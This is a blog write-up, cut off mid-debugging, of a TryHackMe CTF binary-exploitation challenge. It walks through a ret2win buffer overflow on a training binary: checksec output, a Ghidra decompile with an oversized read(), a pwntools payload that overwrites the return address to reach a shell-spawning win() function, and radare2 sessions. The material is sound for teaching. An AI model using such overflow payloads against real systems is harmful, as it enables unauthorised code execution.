<!DOCTYPE html><html lang="en">
  <head><!-- Global site tag (gtag.js) - Google Analytics -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=G-8G2R9MG8CJ"></script>
	<script>
		window.dataLayer = window.dataLayer || [];
		function gtag(){dataLayer.push(arguments);}
		gtag('js', new Date());

		gtag('config', 'G-8G2R9MG8CJ');
		
	</script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>Industrial - TryHackMe CTF Writeup - CTF Vault</title>

<meta name="description" content="Solving a medium rated THM CTF pwn challenge.">
<link rel="canonical" href="https://ctf.mehulsingh.com/industrial.thm"><link rel="alternate" type="application/rss+xml" title="CTF Vault" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">

<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">

<meta name="theme-color" content="#ffffff">
<!-- end favicons snippet --><link rel="apple-touch-img/logo-precomposed" href="/assets/android-chrome-512x512.png">
<link rel="apple-touch-img/logo" href="/assets/android-chrome-512x512.png">
<link rel="apple-touch-img/logo" sizes="72x72" href="/assets/mstile-70x70.png">
<link rel="apple-touch-img/logo" sizes="114x114" href="/assets/mstile-144x144.png">

    <!-- Open Graphs -->
<meta property="og:image" content="https://xmehulx.github.io/terminal/assets/android-chrome-512x512.png">
<meta property="og:description" content="Solving a medium rated THM CTF pwn challenge.">
<meta property="og:type" content="website">
<meta property="og:title" content="Industrial - TryHackMe CTF Writeup">
<meta property="og:url" content="https://ctf.mehulsingh.com/industrial.thm">
<!-- Twitter cards -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="0x__shell">
<meta name="twitter:creator" content="@0x__shell">
<meta name="twitter:title" content="Industrial - TryHackMe CTF Writeup">
<meta name="twitter:description" content="Solving a medium rated THM CTF pwn challenge.">
<meta name="twitter:image" content="/assets/android-chrome-512x512.png"><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css" ><!-- start custom head snippets -->

<!-- end custom head snippets -->
<script>(function() {
  window.isArray = function(val) {
    return Object.prototype.toString.call(val) === '[object Array]';
  };
  window.isString = function(val) {
    return typeof val === 'string';
  };

  window.hasEvent = function(event) {
    return 'on'.concat(event) in window.document;
  };

  window.isOverallScroller = function(node) {
    return node === document.documentElement || node === document.body || node === window;
  };

  window.isFormElement = function(node) {
    var tagName = node.tagName;
    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
  };

  window.pageLoad = (function () {
    var loaded = false, cbs = [];
    window.addEventListener('load', function () {
      var i;
      loaded = true;
      if (cbs.length > 0) {
        for (i = 0; i < cbs.length; i++) {
          cbs[i]();
        }
      }
    });
    return {
      then: function(cb) {
        cb && (loaded ? cb() : (cbs.push(cb)));
      }
    };
  })();
})();
(function() {
  window.throttle = function(func, wait) {
    var args, result, thisArg, timeoutId, lastCalled = 0;

    function trailingCall() {
      lastCalled = new Date;
      timeoutId = null;
      result = func.apply(thisArg, args);
    }
    return function() {
      var now = new Date,
        remaining = wait - (now - lastCalled);

      args = arguments;
      thisArg = this;

      if (remaining <= 0) {
        clearTimeout(timeoutId);
        timeoutId = null;
        lastCalled = now;
        result = func.apply(thisArg, args);
      } else if (!timeoutId) {
        timeoutId = setTimeout(trailingCall, remaining);
      }
      return result;
    };
  };
})();
(function() {
  var Set = (function() {
    var add = function(item) {
      var i, data = this._data;
      for (i = 0; i < data.length; i++) {
        if (data[i] === item) {
          return;
        }
      }
      this.size ++;
      data.push(item);
      return data;
    };

    var Set = function(data) {
      this.size = 0;
      this._data = [];
      var i;
      if (data.length > 0) {
        for (i = 0; i < data.length; i++) {
          add.call(this, data[i]);
        }
      }
    };
    Set.prototype.add = add;
    Set.prototype.get = function(index) { return this._data[index]; };
    Set.prototype.has = function(item) {
      var i, data = this._data;
      for (i = 0; i < data.length; i++) {
        if (this.get(i) === item) {
          return true;
        }
      }
      return false;
    };
    Set.prototype.is = function(map) {
      if (map._data.length !== this._data.length) { return false; }
      var i, j, flag, tData = this._data, mData = map._data;
      for (i = 0; i < tData.length; i++) {
        for (flag = false, j = 0; j < mData.length; j++) {
          if (tData[i] === mData[j]) {
            flag = true;
            break;
          }
        }
        if (!flag) { return false; }
      }
      return true;
    };
    Set.prototype.values = function() {
      return this._data;
    };
    return Set;
  })();

  window.Lazyload = (function(doc) {
    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
    var createNode = function(name, attrs) {
      var node = doc.createElement(name), attr;
      for (attr in attrs) {
        if (attrs.hasOwnProperty(attr)) {
          node.setAttribute(attr, attrs[attr]);
        }
      }
      return node;
    };
    var end = function(type, url) {
      var s, q, qi, cbs, i, j, cur, val, flag;
      if (type === 'js' || type ==='css') {
        s = sources[type], q = queue[type];
        s[url] = true;
        for (i = 0; i < q.length; i++) {
          cur = q[i];
          if (cur.urls.has(url)) {
            qi = cur, val = qi.urls.values();
            qi && (cbs = qi.callbacks);
            for (flag = true, j = 0; j < val.length; j++) {
              cur = val[j];
              if (!s[cur]) {
                flag = false;
              }
            }
            if (flag && cbs && cbs.length > 0) {
              for (j = 0; j < cbs.length; j++) {
                cbs[j].call(context);
              }
              qi.load = true;
            }
          }
        }
      }
    };
    var load = function(type, urls, callback) {
      var s, q, qi, node, i, cur,
        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
      if (type === 'js' || type ==='css') {
        s = sources[type], q = queue[type];
        for (i = 0; i < q.length; i++) {
          cur = q[i];
          if (_urls.is(cur.urls)) {
            qi = cur;
            break;
          }
        }
        val = _urls.values();
        if (qi) {
          callback && (qi.load || qi.callbacks.push(callback));
          callback && (qi.load && callback());
        } else {
          q.push({
            urls: _urls,
            callbacks: callback ? [callback] : [],
            load: false
          });
          for (i = 0; i < val.length; i++) {
            node = null, url = val[i];
            if (s[url] === undefined) {
              (type === 'js' ) && (node = createNode('script', { src: url }));
              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
              if (node) {
                node.onload = (function(type, url) {
                  return function() {
                    end(type, url);
                  };
                })(type, url);
                (doc.head || doc.body).appendChild(node);
                s[url] = false;
              }
            }
          }
        }
      }
    };
    return {
      js: function(url, callback) {
        load('js', url, callback);
      },
      css: function(url, callback) {
        load('css', url, callback);
      }
    };
  })(this.document);
})();
</script><script>
  (function() {
    var TEXT_VARIABLES = {
      version: '2.2.6',
      sources: {
        font_awesome: 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css',
        jquery: 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js',
        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
        chart: 'https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.7.2/Chart.bundle.min.js',
        gitalk: {
          js: 'https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.2.2/gitalk.min.js',
          css: 'https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.2.2/gitalk.min.css'
        },
        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
        mathjax: 'https://cdn.jsdelivr.net/npm/mathjax@2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
        mermaid: 'https://cdn.jsdelivr.net/npm/mermaid@8.0.0/dist/mermaid.min.js'
      },
      site: {
        toc: {
          selectors: 'h1,h2,h3'
        }
      },
      paths: {
        search_js: '/assets/search.js'
      }
    };
    window.TEXT_VARIABLES = TEXT_VARIABLES;
  })();
</script>
</head>
  <body>
    <div class="root" data-is-touch="false">
      <div class="layout--page js-page-root"><div class="page__main js-page-main page__main--immersive page__viewport has-aside cell cell--auto">

      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header header--dark"><div class="main">
      <div class="header__title">
        <div class="header__brand"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 width="24px" height="24px" viewBox="0 0 24 24">
<style type="text/css">
	.st0{fill:#515151;}
</style>
<path class="st0" d="M1.7,22.3c5.7-5.7,11.3-5.7,17,0c3.3-3.3,3.5-5.3,0.8-6c2.7,0.7,3.5-1.1,2.3-5.6s-3.3-5.2-6.3-2.1
	c3-3,2.3-5.2-2.1-6.3S7,1.8,7.7,4.6C7,1.8,5,2.1,1.7,5.3C7.3,11,7.3,16.7,1.7,22.3"/>
</svg>
<a title="Writeups of challenges from various platforms.
" href="/">CTF Vault</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
        <ul><li class="navigation__item"><a href="/archive">Archive</a></li><li class="navigation__item"><a href="https://mehulsingh.com">About</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
      </nav></div>
  </header>
</div><div class="page__content"><div class="article__header--overlay"><div class="hero hero--dark overlay" style="background-image:linear-gradient(to right, rgba(0,0,0,0.0), rgba(0,0,0,0.4)),url(/assets/images/articles/industrial-intrusion.png);"><div class="hero__content"><div class ="main"><div class="article__info clearfix"><ul class="left-col menu"><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive?tag=binary+exploitation">binary exploitation</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive?tag=buffer+overflow">buffer overflow</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive?tag=control+flow+hijack">control flow hijack</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive?tag=debugging">debugging</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive?tag=exploit+development">exploit development</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive?tag=ghidra">ghidra</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive?tag=pwn">pwn</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive?tag=radare2">radare2</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive?tag=ret2win">ret2win</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive?tag=thm">thm</a>
            </li><li>
              <a class="button button--secondary button--pill button--sm"
                href="/archive?tag=x86_64">x86_64</a>
            </li></ul><ul class="right-col menu"><li><i class="fas fa-user"></i> <span>Mehul Singh</span></li><li><i class="far fa-calendar-alt"></i> <span>Jul 01, 2025</span>
            </li></ul></div><div class="article__header"><header><h1>Industrial - TryHackMe CTF Writeup</h1></header></div><p class="overlay__excerpt">Solving a medium rated THM CTF pwn challenge.</p></div></div>
              </div>
            </div><div class ="main"><div class="grid grid--reverse">

              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
</aside></div>

              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->

<!-- end custom main top snippet -->
<article itemscope itemtype="http://schema.org/Article"><meta itemprop="headline" content="Industrial - TryHackMe CTF Writeup"><meta itemprop="author" content="Mehul Singh"/><meta itemprop="datePublished" content="2025-07-01T00:00:00+05:30">
    <meta itemprop="keywords" content="binary exploitation,buffer overflow,control flow hijack,debugging,exploit development,ghidra,pwn,radare2,ret2win,thm,x86_64"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->

<!-- end custom article top snippet -->
<div class="article__content" itemprop="articleBody"><h1 id="overview">Overview</h1>

<p>Today we will work on <a href="http://tryhackme.com/">TryHackMe</a>’s “Industrial” challenge. It was a medium rated pwn challenge and part of THM’s <a href="https://tryhackme.com/industrial-intrusion">Industrial Intrusion</a> CTF. It focused on buffer overflow’s <strong>ret2win</strong> technique to cause the function return to jump to a desired function, while still being mindful of the stack structure. So let’s begin!</p>

<p class="info"><em>Note: Since this was a CTF challenge, the file might not be available. You can find the binary for this file in the <strong><a href="#resources">resources</a></strong> section at the end.</em></p>

<h1 id="initial-checks">Initial Checks</h1>

<h2 id="in-built-capabilities">In-built Capabilities</h2>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>pwn checksec <span class="nt">--file</span> ./industrial
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/Path/To/industrial'</span>
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE <span class="o">(</span>0x400000<span class="o">)</span>
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
</code></pre></div></div>
<p>Nice, we don’t have canary and PIE enabled, which will make debugging and exploit development easier.</p>

<h2 id="manual-test">Manual Test</h2>

<p>As usual, let’s just a feel of the program by running it.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">industrial</span>
<span class="n">Enter</span> <span class="n">the</span> <span class="n">next</span> <span class="n">command</span> <span class="o">:</span> <span class="n">Thanks</span>
<span class="n">Thanks</span>
<span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">industrial</span>
<span class="n">Enter</span> <span class="n">the</span> <span class="n">next</span> <span class="n">command</span> <span class="o">:</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
<span class="n">Thanks</span>
<span class="n">Segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>
<span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">industrial</span>
<span class="n">Enter</span> <span class="n">the</span> <span class="n">next</span> <span class="n">command</span> <span class="o">:</span> <span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
<span class="n">Thanks</span>
<span class="n">Illegal</span> <span class="n">instruction</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>
</code></pre></div></div>

<p>By manual fuzzing we found something interesting. For small inputs (<code class="language-plaintext highlighter-rouge">&lt;40 char</code>), it simply prints “Thanks” and exits, and on longer inputs (<code class="language-plaintext highlighter-rouge">&gt;40 char</code>), it returns segmentation fault indicating a posible buffer overflow situation. But with an input of exactly <code class="language-plaintext highlighter-rouge">40 char</code>, it gives us <strong>Illegal instruction (core dumped)</strong>, which is really interesting as it indicates we are also tampering the instruction pointer somehow.</p>

<h1 id="code-analysis">Code Analysis</h1>

<p>Let’s jump into the actual implementation of code and disassemble it with ghidra first</p>

<h2 id="ghidra-disassembly">Ghidra Disassembly</h2>

<p>The <code class="language-plaintext highlighter-rouge">main()</code> function is pretty straightforward:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">undefined1</span> <span class="n">local_28</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>

  <span class="n">FUN_004010c0</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">FUN_004010c0</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">FUN_004010c0</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Enter the next command : "</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">local_28</span><span class="p">,</span><span class="mh">0x30</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"Thanks"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>where the <code class="language-plaintext highlighter-rouge">FUN_004010c0()</code>function  simply sets the provided stream to be buffered or not using <a href="https://pubs.opengroup.org/onlinepubs/009696599/functions/setvbuf.html">setvbuf()</a> and then reads 48 bytes into a 32 bytes array, which could be an entry to buffer overflow attacks. But apart from that this function doesn’t do much.</p>

<h2 id="exploring-further">Exploring Further</h2>

<p>Upon checking other functions, we can see a <code class="language-plaintext highlighter-rouge">win()</code> function:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">win</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>This spawns a shell and seems like our pathway ahead. Let’s see if we can find a way to reach this function.</p>

<h1 id="exploit">Exploit</h1>

<h2 id="theory">Theory</h2>
<p>Since we can overwrite the array in <code class="language-plaintext highlighter-rouge">main()</code> we could try to manipulate the return address in <code class="language-plaintext highlighter-rouge">main()</code>’s stack frame and jump to this <code class="language-plaintext highlighter-rouge">win()</code> function. We can verify this before developing our exploit by checking <code class="language-plaintext highlighter-rouge">main()</code>’s assembly code:</p>

<div class="language-as highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌</span> <span class="mi">166</span><span class="o">:</span> <span class="nx">int</span> <span class="nx">main</span> <span class="p">(</span><span class="nx">int</span> <span class="nx">argc</span><span class="p">,</span> <span class="nx">char</span> <span class="o">**</span><span class="nx">argv</span><span class="p">,</span> <span class="nx">char</span> <span class="o">**</span><span class="nx">envp</span><span class="p">)</span><span class="o">;</span>
<span class="err">│</span> <span class="nx">afv</span><span class="o">:</span> <span class="nx">vars</span><span class="p">(</span><span class="mi">1</span><span class="o">:</span><span class="nx">sp</span><span class="p">[</span><span class="mh">0x28</span><span class="p">..</span><span class="mh">0x28</span><span class="p">])</span>
<span class="err">│</span>           <span class="mh">0x004011d0</span>      <span class="nx">f30f1efa</span>       <span class="nx">endbr64</span>
<span class="err">│</span>           <span class="mh">0x004011d4</span>      <span class="mi">55</span>             <span class="nx">push</span> <span class="nx">rbp</span>
<span class="err">│</span>           <span class="mh">0x004011d5</span>      <span class="mi">4889</span><span class="nx">e5</span>         <span class="nx">mov</span> <span class="nx">rbp</span><span class="p">,</span> <span class="nx">rsp</span>
<span class="err">│</span>           <span class="mh">0x004011d8</span>      <span class="mi">4883</span><span class="nx">ec20</span>       <span class="nx">sub</span> <span class="nx">rsp</span><span class="p">,</span> <span class="mh">0x20</span>
<span class="err">│</span>           <span class="p">...</span>             <span class="p">...</span>            <span class="p">...</span>
</code></pre></div></div>
<p>So the <code class="language-plaintext highlighter-rouge">main()</code> function is allocating 32 bytes onto the stack, and the next 8 bytes are for previous base pointer and the next 8 after would be the return address, which as a matter of fact coincides with the 48 bytes we are able to overwrite through <code class="language-plaintext highlighter-rouge">local_28</code> array.</p>

<h2 id="exploit-development">Exploit Development</h2>

<h3 id="preliminary-test">Preliminary Test</h3>

<p>This time lets work with radare2. So we load the binary, find the location of the <code class="language-plaintext highlighter-rouge">win()</code> function, set the breakpoint right after our input in <code class="language-plaintext highlighter-rouge">main()</code>.</p>
<div class="language-as highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="mh">0x0040125b</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">pxq</span> <span class="mi">80</span> <span class="err">@</span> <span class="nx">rbp</span><span class="mi">-32</span>
<span class="mh">0x7ffdae61f1f0</span>  <span class="mh">0x0000000000000000</span>  <span class="mh">0x00007f96e17a7900</span>   <span class="p">.........</span><span class="nx">yz</span><span class="p">.....</span>
<span class="mh">0x7ffdae61f200</span>  <span class="mh">0x0000000000000000</span>  <span class="mh">0x00007ffdae61f2a0</span>   <span class="p">..........</span><span class="nx">a</span><span class="p">.....</span>
<span class="mh">0x7ffdae61f210</span>  <span class="mh">0x0000000000000001</span>  <span class="mh">0x00007f96e159dca8</span>   <span class="p">..........</span><span class="nx">Y</span><span class="p">.....</span>
<span class="mh">0x7ffdae61f220</span>  <span class="mh">0x00007ffdae61f310</span>  <span class="mh">0x00000000004011d0</span>   <span class="p">..</span><span class="nx">a</span><span class="p">.......</span><span class="err">@</span><span class="p">.....</span>
<span class="mh">0x7ffdae61f230</span>  <span class="mh">0x0000000100400040</span>  <span class="mh">0x00007ffdae61f328</span>   <span class="err">@</span><span class="p">.</span><span class="err">@</span><span class="p">.....(.</span><span class="nx">a</span><span class="p">.....</span>
<span class="p">[</span><span class="mh">0x0040125b</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">dc</span>
<span class="nx">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
<span class="nl">INFO</span><span class="p">:</span> <span class="nx">hit</span> <span class="nx">breakpoint</span> <span class="nx">at</span><span class="o">:</span> <span class="mh">0x401260</span>
<span class="p">[</span><span class="mh">0x0040125b</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">pxq</span> <span class="mi">80</span> <span class="err">@</span> <span class="nx">rbp</span><span class="mi">-32</span>
<span class="mh">0x7ffdae61f1f0</span>  <span class="mh">0x4141414141414141</span>  <span class="mh">0x4141414141414141</span>   <span class="nx">AAAAAAAAAAAAAAAA</span>
<span class="mh">0x7ffdae61f200</span>  <span class="mh">0x4141414141414141</span>  <span class="mh">0x4141414141414141</span>   <span class="nx">AAAAAAAAAAAAAAAA</span>
<span class="mh">0x7ffdae61f210</span>  <span class="mh">0x000000000000000a</span>  <span class="mh">0x00007f96e159dca8</span>   <span class="p">..........</span><span class="nx">Y</span><span class="p">.....</span>
<span class="mh">0x7ffdae61f220</span>  <span class="mh">0x00007ffdae61f310</span>  <span class="mh">0x00000000004011d0</span>   <span class="p">..</span><span class="nx">a</span><span class="p">.......</span><span class="err">@</span><span class="p">.....</span>
<span class="mh">0x7ffdae61f230</span>  <span class="mh">0x0000000100400040</span>  <span class="mh">0x00007ffdae61f328</span>   <span class="err">@</span><span class="p">.</span><span class="err">@</span><span class="p">.....(.</span><span class="nx">a</span><span class="p">.....</span>
</code></pre></div></div>
<p>This confirms we can overfill the array and overflow into the stack frame (the last <code class="language-plaintext highlighter-rouge">0x0a</code> replaced the value at rbp). So let’s try replacing the return address now. We can create the binary payload to be directly entered in radare2 for this.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">32</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x01</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x004011b6</span><span class="p">)</span>  <span class="c1"># Overflow + new return address
</span><span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">payload.bin</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div></div>

<p>I entered <code class="language-plaintext highlighter-rouge">0x0000000000000001</code> after the A’s as I try to keep the same value at rbp so as to not mess the stack. Although since this rbp is already uncommon, it wouldn’t matter if we use 40 A’s instead. So we prepare our rarun file and run radare.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/rarun2</span>

<span class="nv">program</span><span class="o">=</span>./industrial
<span class="nv">stdin</span><span class="o">=</span>./payload_0a.bin
</code></pre></div></div>

<div class="language-as highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span> <span class="nx">r2</span> <span class="err">-</span><span class="nx">r</span> <span class="nx">run</span><span class="p">.</span><span class="nx">rr2</span> <span class="err">-</span><span class="nx">d</span> <span class="nx">industrial</span>
<span class="nl">WARN</span><span class="p">:</span> <span class="nx">Relocs</span> <span class="nx">has</span> <span class="nx">not</span> <span class="nx">been</span> <span class="nx">applied</span><span class="p">.</span> <span class="nx">Please</span> <span class="nx">use</span> <span class="err">`-</span><span class="nx">e</span> <span class="nx">bin</span><span class="p">.</span><span class="nx">relocs</span><span class="p">.</span><span class="nx">apply</span><span class="o">=</span><span class="kc">true</span><span class="err">`</span> <span class="nx">or</span> <span class="err">`-</span><span class="nx">e</span> <span class="nx">bin</span><span class="p">.</span><span class="nx">cache</span><span class="o">=</span><span class="kc">true</span><span class="err">`</span> <span class="nx">next</span> <span class="nx">time</span>
<span class="p">[</span><span class="mh">0x7fb5ab8f5440</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">aaa</span>
<span class="nl">INFO</span><span class="p">:</span> <span class="nx">Analyze</span> <span class="nx">all</span> <span class="nx">flags</span> <span class="nx">starting</span> <span class="k">with</span> <span class="nx">sym</span><span class="p">.</span> <span class="nx">and</span> <span class="nx">entry0</span> <span class="p">(</span><span class="nx">aa</span><span class="p">)</span>
<span class="nl">INFO</span><span class="p">:</span> <span class="nx">Analyze</span> <span class="nx">imports</span> <span class="p">(</span><span class="nx">af</span><span class="err">@@@</span><span class="nx">i</span><span class="p">)</span>
<span class="nl">INFO</span><span class="p">:</span> <span class="nx">Analyze</span> <span class="nx">entrypoint</span> <span class="p">(</span><span class="nx">af</span><span class="err">@</span> <span class="nx">entry0</span><span class="p">)</span>
<span class="p">...</span>
<span class="nl">INFO</span><span class="p">:</span> <span class="nx">Recovering</span> <span class="nx">local</span> <span class="nx">variables</span> <span class="p">(</span><span class="nx">afva</span><span class="err">@@@</span><span class="nx">F</span><span class="p">)</span>
<span class="nl">INFO</span><span class="p">:</span> <span class="nx">Use</span> <span class="err">-</span><span class="nx">AA</span> <span class="nx">or</span> <span class="nx">aaaa</span> <span class="nx">to</span> <span class="nx">perform</span> <span class="nx">additional</span> <span class="nx">experimental</span> <span class="nx">analysis</span>
<span class="p">[</span><span class="mh">0x7fb5ab8f5440</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">pdf</span> <span class="err">@</span> <span class="nx">sym</span><span class="p">.</span><span class="nx">win</span>
<span class="err">┌</span> <span class="mi">26</span><span class="o">:</span> <span class="nx">sym</span><span class="p">.</span><span class="nx">win</span> <span class="p">()</span><span class="o">;</span>
<span class="err">│</span>           <span class="mh">0x004011b6</span>      <span class="nx">f30f1efa</span>       <span class="nx">endbr64</span>
<span class="err">│</span>           <span class="mh">0x004011ba</span>      <span class="mi">55</span>             <span class="nx">push</span> <span class="nx">rbp</span>
<span class="err">│</span>           <span class="mh">0x004011bb</span>      <span class="mi">4889</span><span class="nx">e5</span>         <span class="nx">mov</span> <span class="nx">rbp</span><span class="p">,</span> <span class="nx">rsp</span>
<span class="err">│</span>           <span class="mh">0x004011be</span>      <span class="mi">488</span><span class="nx">d053f0e</span><span class="p">..</span>   <span class="nx">lea</span> <span class="nx">rax</span><span class="p">,</span> <span class="nx">str</span><span class="p">.</span><span class="nx">_bin_sh</span>    <span class="o">;</span> <span class="mh">0x402004</span> <span class="o">;</span> <span class="s2">"/bin/sh"</span>
<span class="err">│</span>           <span class="mh">0x004011c5</span>      <span class="mi">4889</span><span class="nx">c7</span>         <span class="nx">mov</span> <span class="nx">rdi</span><span class="p">,</span> <span class="nx">rax</span>
<span class="err">│</span>           <span class="mh">0x004011c8</span>      <span class="nx">e8c3feffff</span>     <span class="nx">call</span> <span class="nx">sym</span><span class="p">.</span><span class="nx">imp</span><span class="p">.</span><span class="nx">system</span>     <span class="o">;</span> <span class="nx">int</span> <span class="nx">system</span><span class="p">(</span><span class="kr">const</span> <span class="nx">char</span> <span class="o">*</span><span class="nx">string</span><span class="p">)</span>
<span class="err">│</span>           <span class="mh">0x004011cd</span>      <span class="mi">90</span>             <span class="nx">nop</span>
<span class="err">│</span>           <span class="mh">0x004011ce</span>      <span class="mi">5</span><span class="nx">d</span>             <span class="nx">pop</span> <span class="nx">rbp</span>
<span class="err">└</span>           <span class="mh">0x004011cf</span>      <span class="nx">c3</span>             <span class="nx">ret</span>
<span class="p">[</span><span class="mh">0x7fb5ab8f5440</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">db</span> <span class="mh">0x004011c8</span>
<span class="p">[</span><span class="mh">0x7fb5ab8f5440</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">db</span> <span class="mh">0x004011cd</span>
<span class="p">[</span><span class="mh">0x7fb5ab8f5440</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">dc</span>
<span class="nx">Enter</span> <span class="nx">the</span> <span class="nx">next</span> <span class="nx">command</span> <span class="o">:</span> <span class="nx">Thanks</span>
<span class="nl">INFO</span><span class="p">:</span> <span class="nx">hit</span> <span class="nx">breakpoint</span> <span class="nx">at</span><span class="o">:</span> <span class="mh">0x4011c8</span>
<span class="p">[</span><span class="mh">0x004011c8</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">dc</span>
